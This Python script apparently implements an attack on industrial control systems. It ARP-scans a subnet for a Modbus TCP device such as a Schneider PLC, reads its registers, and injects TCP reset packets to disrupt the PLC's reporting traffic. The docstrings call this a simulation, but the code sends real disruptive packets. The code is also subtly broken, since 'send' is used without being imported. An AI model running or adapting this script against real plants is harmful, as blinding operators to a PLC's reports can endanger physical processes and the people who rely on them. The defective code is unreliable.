from pymodbus.client.sync import ModbusTcpClient
from scapy.all import ARP, Ether, srp, IP, TCP
import logging

logging.basicConfig(level=logging.INFO)


def find_plc_ip(subnet="192.168.9.0/24", known_port=502):
    """
    Scan the subnet to find a Modbus TCP-enabled device like the Schneider PLC.
    Returns the IP address of the live Modbus device, or None.
    """
    logging.info(f"Scanning for Modbus TCP devices on subnet {subnet}...")
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=0)
    
    for _, received in ans:
        target_ip = received.psrc
        # Check if a Modbus TCP server is running on the target
        try:
            logging.info(f"Testing {target_ip} for Modbus TCP...")
            client = ModbusTcpClient(target_ip, port=known_port)
            if client.connect():
                logging.info(f"Modbus TCP server found at {target_ip}")
                client.close()
                return target_ip
        except:
            pass
    
    logging.error("No Modbus TCP devices found in the subnet.")
    return None


def block_reporting_message(plc_ip, port=502):
    """
    Simulate the blocking of reporting messages from the PLC.
    """
    logging.info(f"Blocking reporting messages from PLC at {plc_ip}:{port}...")

    try:
        # Send a Modbus query to verify accessibility
        client = ModbusTcpClient(plc_ip, port=port)
        if not client.connect():
            logging.error("Failed to connect to PLC. Exiting.")
            return
        
        # Read holding register to simulate normal operation (for demonstration)
        logging.info("Reading holding registers (example read)...")
        result = client.read_holding_registers(address=0, count=10, unit=1)
        if result.isError():
            logging.error("Failed to read holding registers.")
        else:
            logging.info(f"Preliminary data read: {result.registers}")
        
        client.close()

        # Use Scapy to send a TCP reset packet to terminate the session
        logging.info(f"Injecting TCP RST packets to disrupt Modbus communication...")
        packet = IP(dst=plc_ip) / TCP(dport=port, flags="R")
        send(packet, count=10, verbose=0)  # Send reset packets to disrupt the connection
        
        # Optionally, simulate sustained blocking by repeating this process
        # for critical moments or via a loop, if required.

        logging.info(f"Reporting message from the PLC at {plc_ip} blocked.")

    except Exception as e:
        logging.error(f"An error occurred: {e}")


if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    subnet_to_scan = "192.168.9.0/24"
    plc_ip = find_plc_ip(subnet=subnet_to_scan)
    if plc_ip is None:
        logging.error("Could not locate the PLC. Exiting.")
    else:
        # Step 2: Block the reporting messages
        block_reporting_message(plc_ip=plc_ip)